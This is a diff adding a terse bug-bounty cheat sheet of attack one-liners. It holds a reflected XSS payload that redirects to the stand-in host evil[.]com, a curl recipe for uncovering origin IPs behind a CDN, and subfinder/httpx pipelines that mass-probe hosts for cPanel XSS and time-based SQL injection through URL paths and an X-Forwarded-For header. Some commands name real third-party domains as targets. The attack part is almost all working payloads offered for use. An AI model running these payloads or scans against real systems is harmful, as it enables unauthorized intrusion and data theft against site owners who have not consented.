@@ -1,0 +1,44 @@
+Endpoints
+
+
+TIPS > Reflected XSS to Open Redirect: http://sub.sub.domain[.]com/publicsearch?source=%3Cscript%3Ealert(document.domain)%3C/script%3E  for redir: document.location=“https://evil[.]com
+
+
+
+recon-
+Projectdiscovery dnxx
+
+
+XSS=
+/menu/stapp  - xss vis CITRIX ADC
+/api/v1/docs - kube api docs
+?CSCOE
+
+#Finding Origin IP 
+Check IP address history from https://viewdns.info/
+or use below command 
+curl 'https://api.viewdns.info/iphistory/?domain=<domain>&apikey=<api key>&output=json' -H 'User-Agent: Mozilla/5.0 Windows NT 10.0 Win64 AppleWebKit/537.36 Chrome/69.0.3497.100' | jq . | grep ip | cut -d '"' -f4 | tail -n+2
+References:- https://twitter.com/yassineaboukir/status/932908449775669248
+https://github.com/christophetd/CloudFlair
+
+
+
+
+##OneLiners
+
+subfinder -d walkme.com -silent -all | httpx -silent -ports http:80,https:443,2082,2083 -path '/cpanelwebcall/<img%20src=x%20onerror="prompt(document.domain)">aaaaaaaaaaaaaaa' -mc 400
+
+Sqli 
+
+cat web.list | httpx -silent -path '/sitemap.xml?offset=1%3bSELECT%20IF((8303%3E8302)%2cSLEEP(10)%2c2356)%23' -rt -timeout 20 -mrt '>10'
+
+cat web.list | httpx -silent -H "X-Forwarded-For: 'XOR(if(now()=sysdate(),sleep(10),0))OR" -rt -timeout 20 -mrt '>10'
+
+
+
+
+subfinder -dL  subraw.txt -silent -all | httpx -silent -ports http:80,https:443,2082,2083 -path '/cpanelwebcall/<img%20src=x%20onerror="prompt(document.domain)">aaaaaaaaaaaaaaa' -mc 400 | tee finale.txt
+
+
+
+ffuf -w  -u https://ia1webdslb.amm.ibmcloud.com/sap/wdisp/admin/ -r -mc 200 -fc 200
